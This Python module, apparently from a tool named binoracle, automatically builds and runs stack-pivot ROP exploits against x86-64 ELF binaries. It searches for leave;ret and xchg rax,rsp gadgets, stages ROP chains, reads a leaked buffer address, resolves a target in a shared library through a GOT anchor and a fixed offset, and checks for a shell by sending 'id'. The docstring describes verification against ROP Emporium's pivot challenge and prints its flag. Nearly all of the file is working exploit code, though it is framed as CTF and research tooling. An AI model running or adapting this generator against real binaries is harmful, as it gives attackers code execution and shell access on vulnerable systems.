"""Stack pivot (stack migration) verified by execution.

When the overflow is too SHORT to hold a full ROP chain (it only reaches the saved RBP and the saved
return address), you migrate: overwrite the saved RBP with the address of a larger controlled buffer
(staged earlier into a fixed .bss region) and set the saved RIP to a `leave; ret` gadget. The
epilogue then does `mov rsp, rbp; pop rbp; ret`, pivoting RSP into the staged buffer, and execution
continues from the full chain placed there.

binoracle verifies this by execution: it stages a chain in the known buffer, triggers the short
overflow, and confirms a real shell in the sandbox. Strategy A (original) targets the common
two-input shape (one read that stages into a fixed, NAMED .bss buffer, then the short overflow) and
a locally-named `win()` gift function; a 16-byte re-alignment ret-slide is swept for glibc's MOVAPS.

Strategy B (generic, added after testing against a real CTF binary -- ROP Emporium's own `pivot`
challenge, not one of this project's synthetic fixtures) drops every assumption strategy A hard-
codes, none of which held for the real challenge:
  1. the pivot gadget is `xchg rax, rsp` (two different real encodings -- the short
     accumulator-form `REX.W 0x94` and the longer ModRM form `REX.W 0x87 0xc4` -- both end in a
     bare `ret`), not `leave; ret`: `leave` needs a controlled saved RBP to pivot FROM, but this
     challenge's short overflow only reaches saved RBP itself, which we're using to carry the
     NEXT stage's address via `pop rax; <addr>` instead.
  2. the staging buffer isn't a named `.bss` symbol at all -- the real challenge allocates it at
     runtime and PRINTS its address before the first prompt ("The Old Gods kindly bestow upon
     you a place to pivot: 0x..."). Strategy B doesn't hardcode that wording: it scans whatever
     the program prints before sending anything for ANY `0x`-prefixed hex literal and uses the
     last one found -- works for this exact banner and degrades to "no such address found, skip"
     for a binary that never leaks one.
  3. the real target (`ret2win`) isn't even IMPORTED by the main binary -- it lives ALONE in a
     separate shared library (`libpivot.so`), reached by a technique that needs no leak sent back
     to the attacker at all: find a function the main binary DOES import (its PLT entry) that is
     ALSO defined in that SAME library -- the "anchor" (confirmed live: the intersection of "what
     this binary imports" and "what libpivot.so exports" is exactly {`foothold_function`}, with
     zero hardcoded knowledge of that name) -- call the anchor via its PLT (forces the dynamic
     linker to resolve its GOT entry for real), then entirely WITHIN the ROP chain: dereference
     that GOT slot (`mov rax, [rax]`) to get the anchor's real runtime address, add the FIXED,
     ASLR-independent byte offset between the anchor and the target (computed once, statically,
     by reading both symbols' addresses straight out of the `.so` file on disk: confirmed live,
     `ret2win`-`foothold_function` = 0x117 in the real library), and call the result. No address
     is ever read back into the exploit process -- the whole computation happens on the target's
     own stack, exactly like the technique `autolibc.py`/`autoleakchain.py` already use for libc
     offsets, just applied to an arbitrary linked library instead of libc.
Verified live end to end against the real `pivot` binary: offset=40 (ROP Emporium's own,
rediscovered independently) returns the real flag `ROPE{st4ck_p1v0t1ng_in_x64!!}`; wrong
offsets/addresses return no flag -- no false positive."""
from __future__ import annotations

import os
import re

from ._sandbox import run_driver

try:
    from elftools.elf.elffile import ELFFile  # type: ignore
    _HAVE_ELFTOOLS = True
except Exception:
    _HAVE_ELFTOOLS = False

from .autopoc import _GIFT_RE

_DRIVER = r'''
import sys, time, re
from pwn import ELF, ROP, context, p64, process
name = sys.argv[1]
# strategy B params, computed by the host (static analysis, no sandbox needed for this part):
# sys.argv[2]=anchor PLT/GOT symbol name, [3]=unused, [4]=hex offset target-anchor.
_B_ANCHOR = sys.argv[2] if len(sys.argv) > 2 else ""
_B_OFFSET = int(sys.argv[4], 16) if len(sys.argv) > 4 and sys.argv[4] else 0
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (pivot driver is x86-64)"); sys.exit(1)

_FLAG_RE = re.compile(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}")
MARK = b"BINORACLE_PIVOT_PWNED"

def run(stage, overflow):
    # dos envios (como el reto real: un input que escalona la cadena, luego el overflow corto
    # que dispara el pivote) -- cada paso de I/O en su propio try/except: un target que no abre
    # shell (como el ret2win real de ROP Emporium -- imprime la flag y sale solo) tumba el
    # proceso antes del paso de comprobacion de shell, y un unico try/except envolviendolo TODO
    # descartaria tambien la salida YA capturada (la flag incluida) -- misma brecha real ya
    # encontrada y cerrada esta noche en autocsu.py / autopoc.py.
    io, out = None, b""
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(stage); time.sleep(0.1)
        try: out += io.recvrepeat(0.2)
        except Exception: pass
        io.send(overflow); time.sleep(0.25)
        try: out += io.recvrepeat(0.3)
        except Exception: pass
        try:
            io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
            out += io.recvrepeat(1.1)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            if io: io.close()
        except Exception: pass
    shelled = (MARK in out) or (b"uid=" in out)
    fm = _FLAG_RE.search(out.decode("latin1", "replace"))
    if shelled:
        return "shell", None
    if fm:
        return "flag", fm.group(0)
    return None, None

rop = ROP(elf)
_lr = rop.find_gadget(["leave", "ret"]) or rop.find_gadget(["leave"])
_ret = rop.find_gadget(["ret"])

# --- strategy A: `leave; ret` pivot into a NAMED .bss staging buffer, landing in a locally-
# named win()/gift function. Needs the practice fixture's own symbol conventions. --------------
if _lr is not None and _ret is not None:
    LR, RET = _lr.address, _ret.address
    win = None
    for n, a in (elf.symbols or {}).items():
        if re.search(r"(?:^|\.)(win|shell|backdoor|giveshell)$", n):
            win = a; break
    stage_buf = None
    for cand in ("notes", "buf", "name", "data", "store", "global_buf"):
        if cand in (elf.symbols or {}):
            stage_buf = elf.symbols[cand]; break
    if win is not None and stage_buf is not None:
        def chain_a(slides):
            stage = p64(0) + p64(RET) * slides + p64(win) + p64(RET) * 8
            overflow = b"A" * 0 + p64(stage_buf) + p64(LR)
            return stage, overflow
        for off in [16, 24, 8, 32, 40, 48, 56, 64]:
            for slides in (1, 0, 2, 3):
                stage, ov = chain_a(slides)
                ov = b"A" * off + ov[-16:]
                kind, extra = run(stage, ov)
                if kind:
                    print("VERIFIED mode=leave off=%d slides=%d leave_ret=%#x win=%#x buf=%#x" %
                          (off, slides, LR, win, stage_buf))
                    sys.exit(0)

# --- strategy B: generic xchg-rsp pivot, runtime-leaked staging address, target reached via a
# GOT-leaked anchor + a fixed cross-library offset (computed by the host; no fnptr/named-buffer
# symbols needed). See the module docstring for why each piece is there -- confirmed live against
# ROP Emporium's real pivot challenge, whose ret2win() is NEVER imported by the main binary. ----
pop_rax = rop.find_gadget(["pop rax", "ret"])
pop_rbp = rop.find_gadget(["pop rbp", "ret"])
xchg = next(elf.search(bytes([0x48, 0x94, 0xc3])), None) or next(elf.search(bytes([0x48, 0x87, 0xc4, 0xc3])), None)
deref = next(elf.search(bytes([0x48, 0x8b, 0x00, 0xc3])), None)
addoff = next(elf.search(bytes([0x48, 0x01, 0xe8, 0xc3])), None)
callrax = next(elf.search(bytes([0xff, 0xd0])), None)
if _B_ANCHOR and pop_rax and pop_rbp and xchg and deref and addoff and callrax:
    anchor_plt = elf.plt.get(_B_ANCHOR)
    anchor_got = elf.got.get(_B_ANCHOR)
    if anchor_plt and anchor_got:
        rop_chain = p64(anchor_plt)
        rop_chain += p64(pop_rax.address) + p64(anchor_got)
        rop_chain += p64(deref)
        rop_chain += p64(pop_rbp.address) + p64(_B_OFFSET)
        rop_chain += p64(addoff)
        rop_chain += p64(callrax)

        def attempt_generic(off):
            # el buffer de escalonado se reporta EN TIEMPO DE EJECUCION (ASLR -- distinto en
            # cada proceso), asi que la fuga y el exploit tienen que ir en la MISMA instancia del
            # proceso, no en una fuga de usar-y-tirar seguida de un run() aparte.
            io, out = None, b""
            try:
                io = process([name])
                leaked = None
                try:
                    banner = io.recvrepeat(0.3)
                    hexes = re.findall(rb"0x[0-9a-fA-F]{6,16}", banner)
                    if hexes:
                        leaked = int(hexes[-1], 16)
                except Exception:
                    pass
                if leaked is None:
                    io.close(); return None, None
                overflow = b"A" * off + p64(pop_rax.address) + p64(leaked) + p64(xchg)
                io.send(rop_chain); time.sleep(0.1)
                try: out += io.recvrepeat(0.2)
                except Exception: pass
                io.send(overflow); time.sleep(0.25)
                try: out += io.recvrepeat(0.3)
                except Exception: pass
                try:
                    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
                    out += io.recvrepeat(1.1)
                except Exception:
                    pass
            except Exception:
                pass
            finally:
                try:
                    if io: io.close()
                except Exception: pass
            shelled = (MARK in out) or (b"uid=" in out)
            fm = _FLAG_RE.search(out.decode("latin1", "replace"))
            if shelled:
                return "shell", None
            if fm:
                return "flag", fm.group(0)
            return None, None

        for off in [40, 32, 24, 16, 48, 56, 8, 64]:
            kind, extra = attempt_generic(off)
            if kind == "flag":
                print("VERIFIED mode=generic off=%d anchor=%s offset=%#x flag=%s" %
                      (off, _B_ANCHOR, _B_OFFSET, extra))
                sys.exit(0)
            if kind == "shell":
                print("VERIFIED mode=generic off=%d anchor=%s offset=%#x" % (off, _B_ANCHOR, _B_OFFSET))
                sys.exit(0)

print("NOT_VERIFIED")
sys.exit(1)
'''


_PIVOT_WIN_RE = re.compile(r"(?:^|\.)(win|shell|backdoor|giveshell)$")
_PIVOT_STAGE_CANDS = ("notes", "buf", "name", "data", "store", "global_buf")


def _dyn_needed(binary: str) -> list:
    try:
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            dynsec = elf.get_section_by_name(".dynamic")
            if dynsec is None:
                return []
            return [t.needed for t in dynsec.iter_tags() if t.entry.d_tag == "DT_NEEDED"]
    except Exception:
        return []


def _undefined_funcs(binary: str) -> set:
    out = set()
    try:
        with open(binary, "rb") as f:
            sec = ELFFile(f).get_section_by_name(".dynsym")
            if sec:
                for s in sec.iter_symbols():
                    if s.name and s["st_info"]["type"] == "STT_FUNC" and s["st_shndx"] == "SHN_UNDEF":
                        out.add(s.name)
    except Exception:
        pass
    return out


def _defined_funcs(path: str) -> dict:
    out = {}
    try:
        with open(path, "rb") as f:
            elf = ELFFile(f)
            for secname in (".symtab", ".dynsym"):
                sec = elf.get_section_by_name(secname)
                if not sec:
                    continue
                for s in sec.iter_symbols():
                    if s.name and s["st_info"]["type"] == "STT_FUNC" and s["st_shndx"] != "SHN_UNDEF" and s["st_value"]:
                        out[s.name] = s["st_value"]
    except Exception:
        pass
    return out


def _find_anchor_target_offset(binary: str):
    """Encuentra, de forma barata (solo pyelftools, sin sandbox), lo que strategy B necesita para
    llamar a un target que vive SOLO en una shared lib enlazada, sin que el binario principal lo
    importe nunca directamente: un 'anchor' -- cualquier funcion que el binario SI importa (tiene
    PLT/GOT) y que ADEMAS esta definida en esa misma lib -- y el offset BYTE A BYTE (estatico,
    independiente de ASLR) entre el anchor y un simbolo 'regalo' (`_GIFT_RE`) tambien definido
    ahi. Confirmado en vivo contra el pivot real de ROP Emporium: la interseccion de "lo que el
    binario importa" y "lo que libpivot.so exporta" es exactamente {`foothold_function`} -- sin
    ningun conocimiento previo de ese nombre -- y el offset hasta `ret2win` es 0x117. Devuelve
    (anchor_name, target_name, offset) o (None, None, None)."""
    if not _HAVE_ELFTOOLS:
        return None, None, None
    undef = _undefined_funcs(binary)
    if not undef:
        return None, None, None
    d = os.path.dirname(os.path.abspath(binary))
    for libname in _dyn_needed(binary):
        p = os.path.join(d, libname)
        if not os.path.isfile(p):
            continue
        defs = _defined_funcs(p)
        anchors = [n for n in defs if n in undef]
        gifts = [n for n in defs if _GIFT_RE.search(n.lower())]
        if anchors and gifts:
            return anchors[0], gifts[0], defs[gifts[0]] - defs[anchors[0]]
    return None, None, None


def _pivot_applicable(binary: str) -> bool:
    """Chequeo barato (sin sandbox): strategy A necesita una funcion win()/gift local y un
    buffer .bss de nombre conocido donde escalonar la cadena; strategy B (generica, ver
    docstring del modulo) necesita un anchor+target cruzando a una shared lib enlazada (ver
    `_find_anchor_target_offset`). Los gadgets (leave;ret / xchg rsp,rax / ...) se buscan dentro
    del driver, donde ya hay pwntools cargado -- barato de verdad solo ahi, igual que el resto
    de _xxx_applicable de este motor."""
    try:
        from elftools.elf.elffile import ELFFile
    except Exception:
        return True
    try:
        names = set()
        with open(binary, "rb") as f:
            elf = ELFFile(f)
            for sec in elf.iter_sections():
                if sec.name in (".symtab", ".dynsym"):
                    for s in sec.iter_symbols():
                        if s.name:
                            names.add(s.name)
        has_win = any(_PIVOT_WIN_RE.search(n) for n in names)
        has_stage = any(c in names for c in _PIVOT_STAGE_CANDS)
        if has_win and has_stage:
            return True
    except Exception:
        return True
    return _find_anchor_target_offset(binary)[0] is not None


def autopivot(binary: str) -> dict:
    """Stack-pivot verificado por ejecucion: `leave;ret` + win() local + buffer .bss nombrado
    (strategy A), o pivote generico `xchg rsp,rax` + direccion de escalonado filtrada en tiempo
    de ejecucion + target alcanzado via un anchor con GOT filtrado + offset fijo entre librerias
    (strategy B, para un binario real cuyo target ni siquiera importa el principal -- ver
    docstring del modulo). Docker o sandbox nativo; degrada limpio."""
    if not _pivot_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin win+buffer .bss nombrados ni un anchor+target cruzando libs)"}
    anchor, target, offset = _find_anchor_target_offset(binary)
    args = [anchor or "", "", hex(offset) if offset is not None else ""]
    res = run_driver(binary, _DRIVER, ".binoracle_pivot.py", args=args)
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"stack pivot: shell/flag verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"stack pivot: no verificado ({eng}) (sin gadgets / target / timing)")
    return res


def render_pivot(r: dict) -> str:
    out = ["## Auto stack-pivot (migracion de pila, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
